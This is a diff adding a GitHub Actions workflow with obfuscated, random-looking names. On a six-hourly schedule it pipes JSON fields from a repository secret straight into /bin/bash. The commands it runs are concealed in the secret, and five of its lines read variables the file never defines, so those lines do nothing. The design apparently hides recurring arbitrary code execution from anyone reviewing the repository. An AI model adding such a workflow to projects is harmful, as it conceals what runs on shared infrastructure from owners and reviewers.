@@ -1,0 +1,23 @@
+name: qinxunji4187
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qinxunji4187
+        env:
+          j22239: ${{ secrets.j22239 }}
+        run: |
+          echo $j22239 | jq -r .bb4 | /bin/bash
+          echo $uiq2141 | jq -r .rdyp79253 | /bin/bash
+          echo $vqtmq36 | jq -r .mp03833 | /bin/bash
+          echo $knq6 | jq -r .s97 | /bin/bash
+          echo $r23210 | jq -r .ykudn7 | /bin/bash
+          echo $oxtq1538 | jq -r .f44630 | /bin/bash
+
